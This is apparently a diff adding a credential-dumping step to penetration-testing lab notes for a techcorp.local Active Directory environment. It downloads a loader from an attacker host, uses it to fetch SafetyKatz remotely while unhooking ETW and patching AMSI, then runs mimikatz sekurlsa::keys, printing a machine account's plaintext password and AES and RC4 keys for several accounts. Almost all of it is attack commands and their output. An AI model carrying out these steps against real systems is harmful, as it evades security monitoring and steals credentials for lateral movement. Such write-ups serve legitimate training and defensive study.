@@ -190,4 +190,288 @@ US-MSSQL
 C:\Users\administrator.US>
 ```
 
+DUmp credentials:
 
+```
+PS C:\Users\administrator.US> wget http://192.168.100.17:8989/Loader.exe -o Loader.exe
+wget http://192.168.100.17:8989/Loader.exe -o Loader.exe
+```
+
+```
+mimikatz # C:\Users\administrator.US\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
+C:\Users\administrator.US\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
+[+] Successfully unhooked ETW!
+[+] Successfully patched AMSI!
+[+] URL/PATH : http://192.168.100.17:8989/SafetyKatz.exe Arguments :
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # -path
+ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !
+
+Module :        standard
+Full name :     Standard module
+Description :   Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname
+
+mimikatz(commandline) # http://192.168.100.17:8989/SafetyKatz.exe
+ERROR mimikatz_doLocal ; "http://192.168.100.17:8989/SafetyKatz.exe" command of "standard" module not found !
+
+Module :        standard
+Full name :     Standard module
+Description :   Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::keys
+
+Authentication Id : 0 ; 1777814 (00000000:001b2096)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 4:07:47 AM
+SID               : S-1-5-90-0-2
+
+         * Username : US-MSSQL$
+         * Domain   : us.techcorp.local
+         * Password : )mS[&gC;#3'"\:dOMG&lP ?q<ir-7S5Ce]&[41Lfz_T#fv0u`?do,u[xSI%yGT/tEL&V(rwy:!A;MLDKKZ0hf0&14F$Z"+Hh5#)sLH<7LJNDt-?O$c'+Q+@6
+         * Key List :
+           aes256_hmac       bfaf6c480e12780af8ced22c53821e0b5fe43a727e3338cc88cf2a6dc70adf0e
+           aes128_hmac       8c6685fc6b5047fd5b9037442b70cb40
+           rc4_hmac_nt       ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old      ccda609713cb52b1aa752ee23aaf2fae
+           rc4_md4           ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_nt_exp   ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old_exp  ccda609713cb52b1aa752ee23aaf2fae
+
+Authentication Id : 0 ; 103771 (00000000:0001955b)
+Session           : Service from 0
+User Name         : dbservice
+Domain            : US
+Logon Server      : US-DC
+Logon Time        : 12/26/2022 3:39:17 AM
+SID               : S-1-5-21-210670787-2521448726-163245708-1121
+
+         * Username : dbservice
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       60a8d36102239cd0026d105dbd1e4f253d244cd24d0abda135b4314cf468ca5f
+           rc4_hmac_nt       e060fc2798a6cc9d9ac0a3bb9bf5529b
+           rc4_hmac_old      e060fc2798a6cc9d9ac0a3bb9bf5529b
+           rc4_md4           e060fc2798a6cc9d9ac0a3bb9bf5529b
+           rc4_hmac_nt_exp   e060fc2798a6cc9d9ac0a3bb9bf5529b
+           rc4_hmac_old_exp  e060fc2798a6cc9d9ac0a3bb9bf5529b
+
+Authentication Id : 0 ; 1777755 (00000000:001b205b)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 4:07:47 AM
+SID               : S-1-5-90-0-2
+
+         * Username : US-MSSQL$
+         * Domain   : us.techcorp.local
+         * Password : )mS[&gC;#3'"\:dOMG&lP ?q<ir-7S5Ce]&[41Lfz_T#fv0u`?do,u[xSI%yGT/tEL&V(rwy:!A;MLDKKZ0hf0&14F$Z"+Hh5#)sLH<7LJNDt-?O$c'+Q+@6
+         * Key List :
+           aes256_hmac       bfaf6c480e12780af8ced22c53821e0b5fe43a727e3338cc88cf2a6dc70adf0e
+           aes128_hmac       8c6685fc6b5047fd5b9037442b70cb40
+           rc4_hmac_nt       ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old      ccda609713cb52b1aa752ee23aaf2fae
+           rc4_md4           ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_nt_exp   ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old_exp  ccda609713cb52b1aa752ee23aaf2fae
+
+Authentication Id : 0 ; 1773285 (00000000:001b0ee5)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 4:07:47 AM
+SID               : S-1-5-96-0-2
+
+         * Username : US-MSSQL$
+         * Domain   : us.techcorp.local
+         * Password : )mS[&gC;#3'"\:dOMG&lP ?q<ir-7S5Ce]&[41Lfz_T#fv0u`?do,u[xSI%yGT/tEL&V(rwy:!A;MLDKKZ0hf0&14F$Z"+Hh5#)sLH<7LJNDt-?O$c'+Q+@6
+         * Key List :
+           aes256_hmac       bfaf6c480e12780af8ced22c53821e0b5fe43a727e3338cc88cf2a6dc70adf0e
+           aes128_hmac       8c6685fc6b5047fd5b9037442b70cb40
+           rc4_hmac_nt       ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old      ccda609713cb52b1aa752ee23aaf2fae
+           rc4_md4           ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_nt_exp   ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old_exp  ccda609713cb52b1aa752ee23aaf2fae
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : US-MSSQL$
+Domain            : US
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:39:02 AM
+SID               : S-1-5-18
+
+         * Username : us-mssql$
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       3e9b010d883ed1289099e3185eb59c0b846df40014a02bbe4a43228903355b3c
+           rc4_hmac_nt       ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old      ccda609713cb52b1aa752ee23aaf2fae
+           rc4_md4           ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_nt_exp   ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old_exp  ccda609713cb52b1aa752ee23aaf2fae
+
+Authentication Id : 0 ; 50128 (00000000:0000c3d0)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:39:03 AM
+SID               : S-1-5-90-0-1
+
+         * Username : US-MSSQL$
+         * Domain   : us.techcorp.local
+         * Password : )mS[&gC;#3'"\:dOMG&lP ?q<ir-7S5Ce]&[41Lfz_T#fv0u`?do,u[xSI%yGT/tEL&V(rwy:!A;MLDKKZ0hf0&14F$Z"+Hh5#)sLH<7LJNDt-?O$c'+Q+@6
+         * Key List :
+           aes256_hmac       bfaf6c480e12780af8ced22c53821e0b5fe43a727e3338cc88cf2a6dc70adf0e
+           aes128_hmac       8c6685fc6b5047fd5b9037442b70cb40
+           rc4_hmac_nt       ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old      ccda609713cb52b1aa752ee23aaf2fae
+           rc4_md4           ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_nt_exp   ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old_exp  ccda609713cb52b1aa752ee23aaf2fae
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : US-MSSQL$
+Domain            : US
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:39:03 AM
+SID               : S-1-5-20
+
+         * Username : us-mssql$
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       3e9b010d883ed1289099e3185eb59c0b846df40014a02bbe4a43228903355b3c
+           rc4_hmac_nt       ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old      ccda609713cb52b1aa752ee23aaf2fae
+           rc4_md4           ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_nt_exp   ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old_exp  ccda609713cb52b1aa752ee23aaf2fae
+
+Authentication Id : 0 ; 30536 (00000000:00007748)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:39:03 AM
+SID               : S-1-5-96-0-0
+
+         * Username : US-MSSQL$
+         * Domain   : us.techcorp.local
+         * Password : )mS[&gC;#3'"\:dOMG&lP ?q<ir-7S5Ce]&[41Lfz_T#fv0u`?do,u[xSI%yGT/tEL&V(rwy:!A;MLDKKZ0hf0&14F$Z"+Hh5#)sLH<7LJNDt-?O$c'+Q+@6
+         * Key List :
+           aes256_hmac       bfaf6c480e12780af8ced22c53821e0b5fe43a727e3338cc88cf2a6dc70adf0e
+           aes128_hmac       8c6685fc6b5047fd5b9037442b70cb40
+           rc4_hmac_nt       ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old      ccda609713cb52b1aa752ee23aaf2fae
+           rc4_md4           ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_nt_exp   ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old_exp  ccda609713cb52b1aa752ee23aaf2fae
+
+Authentication Id : 0 ; 102682 (00000000:0001911a)
+Session           : Service from 0
+User Name         : SQLTELEMETRY
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:39:05 AM
+SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
+
+         * Username : US-MSSQL$
+         * Domain   : us.techcorp.local
+         * Password : )mS[&gC;#3'"\:dOMG&lP ?q<ir-7S5Ce]&[41Lfz_T#fv0u`?do,u[xSI%yGT/tEL&V(rwy:!A;MLDKKZ0hf0&14F$Z"+Hh5#)sLH<7LJNDt-?O$c'+Q+@6
+         * Key List :
+           aes256_hmac       bfaf6c480e12780af8ced22c53821e0b5fe43a727e3338cc88cf2a6dc70adf0e
+           aes128_hmac       8c6685fc6b5047fd5b9037442b70cb40
+           rc4_hmac_nt       ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old      ccda609713cb52b1aa752ee23aaf2fae
+           rc4_md4           ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_nt_exp   ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old_exp  ccda609713cb52b1aa752ee23aaf2fae
+
+Authentication Id : 0 ; 50157 (00000000:0000c3ed)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:39:03 AM
+SID               : S-1-5-90-0-1
+
+         * Username : US-MSSQL$
+         * Domain   : us.techcorp.local
+         * Password : )mS[&gC;#3'"\:dOMG&lP ?q<ir-7S5Ce]&[41Lfz_T#fv0u`?do,u[xSI%yGT/tEL&V(rwy:!A;MLDKKZ0hf0&14F$Z"+Hh5#)sLH<7LJNDt-?O$c'+Q+@6
+         * Key List :
+           aes256_hmac       bfaf6c480e12780af8ced22c53821e0b5fe43a727e3338cc88cf2a6dc70adf0e
+           aes128_hmac       8c6685fc6b5047fd5b9037442b70cb40
+           rc4_hmac_nt       ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old      ccda609713cb52b1aa752ee23aaf2fae
+           rc4_md4           ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_nt_exp   ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old_exp  ccda609713cb52b1aa752ee23aaf2fae
+
+Authentication Id : 0 ; 30573 (00000000:0000776d)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:39:03 AM
+SID               : S-1-5-96-0-1
+
+         * Username : US-MSSQL$
+         * Domain   : us.techcorp.local
+         * Password : )mS[&gC;#3'"\:dOMG&lP ?q<ir-7S5Ce]&[41Lfz_T#fv0u`?do,u[xSI%yGT/tEL&V(rwy:!A;MLDKKZ0hf0&14F$Z"+Hh5#)sLH<7LJNDt-?O$c'+Q+@6
+         * Key List :
+           aes256_hmac       bfaf6c480e12780af8ced22c53821e0b5fe43a727e3338cc88cf2a6dc70adf0e
+           aes128_hmac       8c6685fc6b5047fd5b9037442b70cb40
+           rc4_hmac_nt       ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old      ccda609713cb52b1aa752ee23aaf2fae
+           rc4_md4           ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_nt_exp   ccda609713cb52b1aa752ee23aaf2fae
+           rc4_hmac_old_exp  ccda609713cb52b1aa752ee23aaf2fae
+
+mimikatz #
+
+
+```
